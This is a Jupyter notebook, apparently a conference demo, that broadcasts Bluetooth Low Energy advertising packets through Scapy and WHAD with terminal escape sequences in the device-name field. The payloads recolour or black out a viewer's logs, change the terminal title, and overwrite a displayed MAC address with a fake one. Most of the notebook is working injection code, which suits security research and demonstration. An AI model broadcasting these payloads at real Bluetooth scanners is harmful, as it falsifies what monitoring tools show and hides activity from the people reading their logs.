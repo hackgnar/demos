{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "2ad24a8e-94cc-49f1-a5de-f76def2ec86d",
   "metadata": {},
   "source": [
    "# Send BLE ADV Packets from Scapy over WHAD\n",
    "Brief overview of what this all does"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cac5749e-1c12-48a7-a87e-0bdbd9b50c3e",
   "metadata": {},
   "source": [
    "### Name Drops:\n",
    "* David Leadbeater - DC31 - termaly pwned\n",
    "* Damien Cauquil - DC32 - WHAD (Radiobit DC25)\n",
    "* HD - Some terminal paper in 2003\n",
    "\n",
    "### Imports\n",
    "The biggest gotcha here are the BT imports. WHAD does not do these imports from the CLI `winject` tool which makes packet sends from Scapy fail."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9f202de3-7093-4ab5-86a0-b01d326bcee1",
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy import *\n",
    "from scapy.layers.bluetooth4LE import BTLE_RF, BTLE, BTLE_ADV, BTLE_DATA, BTLE_ADV_IND, EIR_Hdr\n",
    "from scapy.layers.bluetooth import EIR_Flags, EIR_CompleteLocalName\n",
    "from whad.ble.connector.injector import Injector\n",
    "from whad.device import WhadDevice\n",
    "from whad.cli.ui import display_packet\n",
    "from whad.ble import BLE\n",
    "import random\n",
    "import time"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3cc0bea5-dd5d-4d76-aaca-22fb3c5df947",
   "metadata": {},
   "source": [
    "### Device Setup\n",
    "This was a PITA to figure out.  In short, a device goes in a connector. A connector goes in an injector. Packets can then be sent from the injector object. The channel is set to 37 by default in the connector."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d5c7997e-7bba-4eff-88c2-6ebb85d74f9e",
   "metadata": {},
   "outputs": [],
   "source": [
    "dev = WhadDevice.create('uart0')\n",
    "connector = BLE(dev)\n",
    "injector = Injector(dev, connection=connector)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4c3c44c3-2b86-4f33-add5-920b60e04978",
   "metadata": {},
   "outputs": [],
   "source": [
    "def create_address():\n",
    "    address = []\n",
    "    for i in range(6):\n",
    "        address.append(random.randint(0,255))\n",
    "    return bytes(address)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "10c9d628-e3ab-4437-9974-988e44136d3d",
   "metadata": {},
   "outputs": [],
   "source": [
    "def create_packet(payload, randomize_address=False, address='ff:ff:ff:ff:ff:ff'):\n",
    "    payload_len = len(bytes(i,'utf-8'))+2\n",
    "    adv_len = payload_len+9\n",
    "    address = create_address()\n",
    "    pkt = BTLE(access_addr=0x8e89bed6) / BTLE_ADV(\n",
    "        RxAdd=0x00,TxAdd=0x01,ChSel=0,RFU=0,\n",
    "        PDU_type=0x00,Length=adv_len) / BTLE_ADV_IND(                                         #Set adv length\n",
    "        AdvA=address, data=[                                                                  #Set address\n",
    "            EIR_Hdr(len=2,type='flags') / EIR_Flags(flags=0x1a), \n",
    "            EIR_Hdr(len=payload_len, type=0x09) / EIR_CompleteLocalName(local_name=payload)]) #Set payload and payload len\n",
    "    return pkt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "60bb4c67-6764-4458-83ac-b3056d89f036",
   "metadata": {},
   "outputs": [],
   "source": [
    "# color logs blue\n",
    "data = [\"\\033[36mBLE Pkts should b Blue\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "85b54e3c-71c8-4483-a823-91d79f068809",
   "metadata": {},
   "outputs": [],
   "source": [
    "# black out logs\n",
    "data = [\"Goodbye logs..\\033[30m\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "522c3961-b038-4b30-95f7-69fb7c8c28a5",
   "metadata": {},
   "outputs": [],
   "source": [
    "# color reset\n",
    "data = [\"\\033[0mBack to Norm\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "db4b30f1-1ea7-4f08-92fa-8f905c25ef4e",
   "metadata": {},
   "outputs": [],
   "source": [
    "# change title\n",
    "data = [\"\\033]2;💉💉💉💉💉\\033\\\\\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c26f34e6-0c29-4ae3-a67a-2e7cb511c451",
   "metadata": {},
   "outputs": [],
   "source": [
    "# rewrite mac address\n",
    "data = [\"\\rXX:YY:ZZ:SS:KK:VV FakeMAC\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d0a92d5d-dd4f-494f-8a2e-816419a22367",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Normal old data\n",
    "data = [\"Normal\",\n",
    "       \"old\",\n",
    "       \"bluetooth\",\n",
    "       \"device\",\n",
    "       \"data\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "27f08495-d726-44e4-8c5b-694f55387ad3",
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in data:\n",
    "    pkt = create_packet(i)\n",
    "    display_packet(pkt)\n",
    "    for j in range(10):\n",
    "        injector.raw_inject(pkt)\n",
    "        time.sleep(0.3)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3efcbb68-8f74-49c2-8e89-121d45417398",
   "metadata": {},
   "source": [
    "### Cleanup\n",
    "Order matters. Close it all out so the devices are released and reusable by other applications or CLI calls"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4717e100-b843-49ad-ad55-7f54d8737edd",
   "metadata": {},
   "outputs": [],
   "source": [
    "injector.close()\n",
    "connector.close()\n",
    "dev.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8cb1f7a8-2404-4542-bbcf-329db452a354",
   "metadata": {},
   "outputs": [],
   "source": [
    "dev.is_open()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
